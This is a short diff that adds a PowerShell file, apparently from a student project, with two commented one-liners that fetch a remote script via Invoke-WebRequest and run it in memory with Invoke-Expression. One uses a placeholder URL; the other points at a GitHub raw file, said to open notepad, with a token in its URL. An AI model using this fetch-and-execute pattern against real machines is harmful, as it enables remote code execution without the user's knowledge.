@@ -1,0 +1,6 @@
+#Saves the Invoke Web Request under a variable and invokes that expression
+$pl = iwr < Your url for the intended file>?dl=1; invoke-expression $pl
+
+
+#Opens a ps1 cript from github and executes it without dowloading it; This script opens notepad
+$pl = iwr https://raw.githubusercontent.com/Paddlboat/Projektstudium/main/test.ps1?token=GHSAT0AAAAAAB25USJWCLBPUERPVJFSX2UCY3LZHEQ?d1=1; invoke-expression $pl
